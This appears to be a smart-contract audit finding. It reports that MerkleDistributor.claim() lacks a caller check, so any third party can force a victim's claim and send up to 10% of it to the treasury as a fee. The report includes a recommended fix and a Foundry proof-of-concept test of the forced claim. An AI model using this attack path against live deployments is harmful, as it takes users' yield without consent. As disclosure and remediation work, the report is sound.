Audit Report

## Title
Missing Caller-Identity Check Allows Third-Party Fee Extraction on Victim Claims - (File: `contracts/utils/MerkleDistributor/MerkleDistributor.sol`)

## Summary
`MerkleDistributor.claim()` accepts an arbitrary `account` parameter but never validates that `msg.sender == account`. Because merkle proofs are public off-chain data, any unprivileged caller can trigger a claim on behalf of any user. When `feeInBPS > 0`, the fee is deducted from the victim's claimable yield and irrecoverably sent to `protocolTreasury`, and the victim's claim state is permanently updated, preventing any re-claim.

## Finding Description
`MerkleDistributor.claim()` at lines 97–147 of `contracts/utils/MerkleDistributor/MerkleDistributor.sol` performs no caller-identity check. The full execution path is:

1. Attacker calls `claim(index, victim, cumulativeAmount, victimProof)` with a valid public merkle proof.
2. All guards pass: `currentMerkleRoot != 0`, `index` is valid, `isClaimed` returns false, and the merkle proof verifies correctly against `keccak256(abi.encodePacked(index, account, cumulativeAmount))`.
3. `claimableAmount = cumulativeAmount - userClaims[account].cumulativeAmount` is computed for the victim.
4. `fee = (claimableAmount * feeInBPS) / 10_000` is computed and transferred to `protocolTreasury`.
5. Only `claimableAmount - fee` is sent to `account` (the victim).
6. `userClaims[account].lastClaimedIndex` and `userClaims[account].cumulativeAmount` are updated, permanently preventing the victim from re-claiming the same index.

The sibling contract `KernelMerkleDistributor._processClaim()` (lines 311–313) explicitly prevents this with:
```solidity
if (account != msg.sender) {
    revert Unauthorized();
}
```
This guard is entirely absent from `MerkleDistributor`. The maximum fee is `MAX_FEE_IN_BPS = 1000` (10%), settable by the owner at any time via `setFeeInBPS()`.

## Impact Explanation
**High — Theft of unclaimed yield.** The victim is entitled to `claimableAmount` tokens. After a forced third-party claim, they receive only `claimableAmount - fee`. The fee (up to 10%) is permanently transferred to `protocolTreasury` without the victim's consent and cannot be recovered. The victim's claim state is finalized, so the loss is irreversible. This directly matches the allowed impact: *High. Theft of unclaimed yield.*

## Likelihood Explanation
**Medium.** Merkle distribution proofs are standard public off-chain data published by the protocol for self-claiming. Any attacker can read the proof tree, construct a valid `claim()` call for any victim, and submit it. No privileged access, no leaked keys, no front-running dependency, and no victim mistake is required. The only precondition is that the victim has an unclaimed balance and `feeInBPS > 0`. The attack is repeatable across all unclaimed accounts each time a new merkle root is published.

## Recommendation
Add the same caller-identity guard present in `KernelMerkleDistributor._processClaim()` to `MerkleDistributor.claim()`, immediately after the `isClaimed` check and before any state mutation or token transfer:

```solidity
if (account != msg.sender) {
    revert Unauthorized();
}
```

The `Unauthorized` error should also be added to the `IMerkleDistributor` interface defined in `MerkleDistributor.sol`.

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/utils/MerkleDistributor/MerkleDistributor.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("T", "T") { _mint(msg.sender, 1_000_000e18); }
}

contract ForcedClaimTest is Test {
    MerkleDistributor distributor;
    MockToken token;

    address treasury = address(0xdead);
    address alice    = address(0xA11CE);
    address attacker = address(0xBAD);

    function setUp() public {
        token = new MockToken();
        distributor = new MerkleDistributor();

        // Deploy with 10% fee
        distributor.initialize(address(token), treasury, 1000);

        // Build a single-leaf merkle tree for alice: index=1, alice, 1000e18
        bytes32 leaf = keccak256(abi.encodePacked(uint256(1), alice, uint256(1000e18)));
        distributor.setMerkleRoot(leaf); // single-leaf root == leaf itself

        token.transfer(address(distributor), 1000e18);
    }

    function test_forcedClaimDeductsFeeFromVictim() public {
        bytes32[] memory proof = new bytes32[](0); // single-leaf tree, empty proof

        uint256 treasuryBefore = token.balanceOf(treasury);
        uint256 aliceBefore    = token.balanceOf(alice);

        // Attacker triggers alice's claim without alice's consent
        vm.prank(attacker);
        distributor.claim(1, alice, 1000e18, proof);

        // Alice receives only 900e18 (10% fee deducted)
        assertEq(token.balanceOf(alice),   aliceBefore + 900e18);
        // 100e18 permanently sent to treasury without alice's consent
        assertEq(token.balanceOf(treasury), treasuryBefore + 100e18);
        // Alice cannot re-claim
        assertTrue(distributor.isClaimed(1, alice));
    }
}
```